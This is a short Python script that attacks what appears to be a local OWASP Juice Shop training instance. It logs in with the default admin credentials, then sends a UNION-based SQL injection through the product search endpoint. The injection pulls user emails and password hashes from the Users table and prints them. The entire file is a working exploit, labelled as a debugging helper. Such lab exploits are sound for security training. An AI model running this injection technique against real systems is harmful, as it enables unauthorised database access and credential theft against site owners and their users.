
import requests
import json

SERVER = 'http://localhost:3000'

def debug_find_user():
    print("Searching for J12934 using SQL Injection...")
    
    # Login as admin first to get token for search (sometimes public search is limited)
    s = requests.Session()
    try:
        s.post(f'{SERVER}/rest/user/login', json={"email": "admin@juice-sh.op", "password": "admin123"})
        
        # Injection payload to dump users table
        # Map fields (based on Product model):
        # 1: id
        # 2: name
        # 3: description
        # 4: price (Email)
        # 5: deluxePrice (Password)
        # 6: image
        injection = "nonexistent')) UNION SELECT id,'2','3',email,password,'6','7','8','9' FROM Users WHERE email LIKE '%J12934%'--"
        
        res = s.get(f'{SERVER}/rest/products/search', params={'q': injection})
        
        if res.ok:
            data = res.json().get('data', [])
            if data:
                print(f"Found {len(data)} matching users:")
                for u in data:
                    print(f"User Data Raw: {u}")
                    email = u.get('price') # field 4 mapped to price
                    password_hash = u.get('deluxePrice') # field 5 mapped to deluxePrice
                    
                    print(f"Email: {email}")
                    print(f"Password Hash: {password_hash}")
                    
            else:
                print("No user found with email containing 'J12934'.")
        else:
            print(f"Search failed: {res.status_code}")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    debug_find_user()
